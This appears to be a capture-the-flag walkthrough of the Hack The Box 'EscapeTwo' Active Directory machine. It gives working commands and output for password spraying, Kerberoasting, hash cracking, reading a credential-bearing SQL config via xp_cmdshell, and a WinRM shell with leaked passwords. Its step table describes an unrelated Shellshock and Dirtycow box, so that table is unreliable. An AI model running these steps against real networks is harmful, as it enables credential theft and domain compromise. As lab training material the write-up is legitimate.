---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# EscapeTwo

[EscapeTwo](https://app.hackthebox.com/machines/EscapeTwo) is an <mark style="color:green;">easy-rated</mark> box centered on Active Directory compromise. Starting with low-privileged credentials, we access a file share and extract creds from a corrupted Excel file. A password spray reveals a user with `MSSQL` access, leading to `WinRM` access via leaked database creds. Enumeration shows `WriteOwner` rights over an ADCS admin account, allowing us to exploit a certificate services misconfiguration and retrieve the `Administrator` hash â€” achieving full domain compromise.

<table><thead><tr><th width="86" align="center">Step</th><th>Action</th><th width="186">Tool</th><th>Gained</th></tr></thead><tbody><tr><td align="center">1</td><td>Vulnerability scanning</td><td><a href="../../tools/vulnerability-scanners.md"><code>nikto</code></a></td><td>Shellshock vulnerability</td></tr><tr><td align="center">2</td><td>Researching Shellshock</td><td><a href="https://github.com/b4keSn4ke/CVE-2014-6271">PoC</a></td><td>Initial foothold</td></tr><tr><td align="center">3</td><td>System enumeration</td><td><a href="https://github.com/peass-ng/PEASS-ng/releases/tag/20240901-df0685e9"><code>linpeas.sh</code></a></td><td>Dirtycow vulnerability</td></tr><tr><td align="center">4</td><td>Researching Dirtycow</td><td><a href="https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c">PoC</a></td><td>Root access</td></tr></tbody></table>

## ðŸ¦¶ Foothold

{% code overflow="wrap" %}
```bash
# Port-scan the target
$ nmap-scan.sh escapetwo
...
# TCP ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos

135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn

389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)

445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP

1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info:
|   10.10.11.51:1433:
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info:
|   10.10.11.51:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       Post-SP patches applied: false

3268/tcp  open  ldap

# UDP ports
PORT    STATE SERVICE
53/udp  open  domain
88/udp  open  kerberos-sec
123/udp open  ntp
```
{% endcode %}

```bash
# Add FQDN in the local DNS file
$ grep seq /etc/hosts
10.10.11.51     escapetwo DC01.sequel.htb sequel.htb dc01
```

{% code overflow="wrap" %}
```bash
# Enumerate domain users and build a wordlist
$ nxc smb escapetwo -u rose -p KxEPkKe6R8su --users | awk '$1 == "SMB" && $5 != "[+]" && $5 != "-Username-" && $5 != "[*]" && $5 != "Guest" && $5 != "krbtgt" {print $5}' > domain_users

# Password-spray for reused credentials
$ nxc smb escapetwo -u domain_users -p KxEPkKe6R8su --continue-on-success
...

# Test for AS-REPRoasting
$ impacket-GetNPUsers sequel.htb/ -dc-ip escapetwo -no-pass -usersfile domain_users

# Test for Kerberoasting
$ impacket-GetUserSPNs -request -dc-ip escapetwo sequel.htb/rose:KxEPkKe6R8su
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName     Name     MemberOf                                              PasswordLastSet             LastLogon                   Delegation
-----------------------  -------  ----------------------------------------------------  --------------------------  --------------------------  ----------
sequel.htb/sql_svc.DC01  sql_svc  CN=SQLRUserGroupSQLEXPRESS,CN=Users,DC=sequel,DC=htb  2024-06-09 08:58:42.689521  2025-05-27 16:39:53.688253
sequel.htb/ca_svc.DC01   ca_svc   CN=Cert Publishers,CN=Users,DC=sequel,DC=htb          2025-05-27 17:22:29.818174  2025-05-27 16:45:04.623032


[-] CCache file is not found. Skipping...
$krb5tgs$23$*sql_svc$SEQUEL.HTB$sequel.htb/sql_svc*$2cf...d65
$krb5tgs$23$*ca_svc$SEQUEL.HTB$sequel.htb/ca_svc*$b29...4d5

# Crack the obtained hashes
$ hashcat -m 13100 svc_hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
...

```
{% endcode %}

{% code overflow="wrap" %}
```bash
# Enumerate shares
$ nxc smb escapetwo -u rose -p KxEPkKe6R8su --shares
...
SMB         10.10.11.51     445    DC01             Accounting Department READ
SMB         10.10.11.51     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.51     445    DC01             C$                              Default share
SMB         10.10.11.51     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.51     445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share
SMB         10.10.11.51     445    DC01             Users           READ

# Download the interesting shares
$ nxc smb escapetwo -u rose -p KxEPkKe6R8su -M spider_plus -o DOWNLOAD_FLAG=True MAX_FILE_SIZE=420000 OUTPUT_FOLDER=./ EXCLUDE_FILTER=admin$,c$,ipc$,netlogon,sysvol,users
...
```
{% endcode %}

{% code overflow="wrap" %}
```bash
$ file accounting_2024.xlsx
accounting_2024.xlsx: Zip archive data, made by v4.5, extract using at least v2.0, last modified, last modified Sun, Jan 01 1980 00:00:00, uncompressed size 1284, method=deflate

$ unzip accounting_2024.xlsx -d accounting_2024
...
$ unzip accounts.xlsx -d accounts
...
```
{% endcode %}

{% code title="sharedStrings.xml" overflow="wrap" %}
```xml
...
  <si>
    <t xml:space="preserve">NULL</t>
  </si>
  <si>
    <t xml:space="preserve">sa@sequel.htb</t>
  </si>
  <si>
    <t xml:space="preserve">sa</t>
  </si>
  <si>
    <t xml:space="preserve">MSSQLP@ssw0rd!</t>
  </si>
</sst>
```
{% endcode %}

{% code overflow="wrap" %}
```bash
# Password-spray with the new passwords
$ nxc smb escapetwo -u domain_users -p passwords --continue-on-success | grep +
SMB                      10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su
SMB                      10.10.11.51     445    DC01             [+] sequel.htb\oscar:86LxLBMgEWaKUnBG
```
{% endcode %}

{% code overflow="wrap" %}
```bash
$ nxc mssql escapetwo -u sa -p MSSQLP@ssw0rd! --local-auth -x whoami
MSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
MSSQL       10.10.11.51     1433   DC01             [+] Executed command via mssqlexec
MSSQL       10.10.11.51     1433   DC01             sequel\sql_svc
```
{% endcode %}

```bash
$ impacket-mssqlclient sequel.htb/sa@escapetwo
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL (sa  dbo@master)>
```

{% code overflow="wrap" %}
```bash
SQL (sa  dbo@msdb)> EXEC xp_cmdshell 'type c:\SQL2019\ExpressAdv_ENU\sql-configuration.ini'
...
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
...
```
{% endcode %}

{% code overflow="wrap" %}
```bash
$ nxc smb escapetwo -u domain_users -p passwords --continue-on-success | grep +
SMB                      10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su
SMB                      10.10.11.51     445    DC01             [+] sequel.htb\oscar:86LxLBMgEWaKUnBG
SMB                      10.10.11.51     445    DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3
SMB                      10.10.11.51     445    DC01             [+] sequel.htb\sql_svc:WqSZAF6CysDQbGb3
```
{% endcode %}

{% code overflow="wrap" %}
```bash
$ nxc ldap escapetwo -u ryan -p WqSZAF6CysDQbGb3 -M whoami
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.51     389    DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3
WHOAMI      10.10.11.51     389    DC01             distinguishedName: CN=Ryan Howard,CN=Users,DC=sequel,DC=htb
WHOAMI      10.10.11.51     389    DC01             Member of: CN=Management Department,CN=Users,DC=sequel,DC=htb
WHOAMI      10.10.11.51     389    DC01             Member of: CN=Remote Management Users,CN=Builtin,DC=sequel,DC=htb
WHOAMI      10.10.11.51     389    DC01             name: Ryan Howard
WHOAMI      10.10.11.51     389    DC01             Enabled: Yes
WHOAMI      10.10.11.51     389    DC01             Password Never Expires: Yes
WHOAMI      10.10.11.51     389    DC01             Last logon: 133928407707089079
WHOAMI      10.10.11.51     389    DC01             pwdLastSet: 133623393456777728
WHOAMI      10.10.11.51     389    DC01             logonCount: 30
WHOAMI      10.10.11.51     389    DC01             sAMAccountName: ryan
```
{% endcode %}

{% code overflow="wrap" %}
```bash
$ evil-winrm -u ryan -p WqSZAF6CysDQbGb3 -i 10.10.11.51
...
*Evil-WinRM* PS C:\Users\ryan\Documents>
```
{% endcode %}

## ðŸš€ Privilege Escalation

{% code overflow="wrap" %}
```bash
$ nxc ldap 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 --bloodhound -c All --dns-server 10.10.11.51
```
{% endcode %}

<figure><img src="../../.gitbook/assets/escapetwo_ryan_writeowner.png" alt=""><figcaption></figcaption></figure>

